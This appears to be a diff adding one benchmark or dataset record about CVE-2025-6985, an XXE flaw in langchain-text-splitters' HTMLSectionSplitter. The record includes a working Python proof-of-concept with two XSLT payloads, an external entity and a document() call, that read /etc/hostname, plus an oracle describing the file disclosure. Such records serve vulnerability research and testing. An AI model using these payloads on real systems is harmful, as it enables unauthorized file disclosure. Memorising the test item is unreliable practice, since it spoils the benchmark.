@@ -1,0 +1,15 @@
+{
+  "file_id": "324_langchain-text-splitters_huntr_cf78abbb-df3b-43de-b6ee-132b73ff8331",
+  "numeric_id": "324",
+  "library_hint": "langchain-text-splitters",
+  "source": "huntr",
+  "title": "XXE vulnerability in HTMLSectionSplitter due to unsafe XSLT parsing with lxml.etree.parse and lxml.etree.XSLT",
+  "cve": "CVE-2025-6985",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "library": "langchain-text-splitters",
+  "affected_version": "< 0.3.8",
+  "vulnerable_function": "lxml.etree.parse, lxml.etree.XSLT",
+  "triggerability": "indirect",
+  "trigger_payload": "#!/usr/bin/env python3\n\"\"\"\nReproduces XXE in langchain-text-splitters.HTMLSectionSplitter\n✧ Works on both lxml ≤ 4.9 (entity) and ≥ 5.0 (document()).\n\"\"\"\nfrom pathlib import Path\nfrom tempfile import NamedTemporaryFile\nfrom langchain_text_splitters import HTMLSectionSplitter\nHTML = \"<html><body><h1>demo</h1></body></html>\"\n# --- choose ONE payload depending on lxml version ---\n# 1) Classic entity (lxml 4.9 and earlier)\nENTITY_POC = \"\"\"<?xml version=\"1.0\"?>\n<!DOCTYPE xsl:stylesheet [<!ENTITY etc SYSTEM \"file:///etc/hostname\">]>\n<xsl:stylesheet version=\"1.0\"\nxmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n<xsl:template match=\"/\">\n<html><body><h1>XXE</h1><pre>&etc;</pre></body></html>\n</xsl:template>\n</xsl:stylesheet>\"\"\" \n# 2) document() bypass (lxml 5.0+)\nDOC_POC = \"\"\"<?xml version=\"1.0\"?>\n<xsl:stylesheet version=\"1.0\"\nxmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n<xsl:template match=\"/\">\n<html><body><h1>XXE</h1>\n<xsl:copy-of select=\"document('file:///etc/hostname')\"/>\n</body></html>\n</xsl:template>\n</xsl:stylesheet>\"\"\" \npayload = DOC_POC # ← swap to ENTITY_POC if testing lxml 4.9.x\nwith NamedTemporaryFile(\"w\", suffix=\".xslt\") as f:\n    f.write(payload); f.flush()\n    splitter = HTMLSectionSplitter([(\"h1\", \"H\")], xslt_path=f.name)\n    out = splitter.split_text(HTML)\n    print(\"=== XXE result ===\")\n    for chunk in out:\n        print(getattr(chunk, \"page_content\", chunk))",
+  "oracle": "The script prints the contents of /etc/hostname (or any other file referenced) inside the transformed HTML, confirming arbitrary file disclosure."
+}
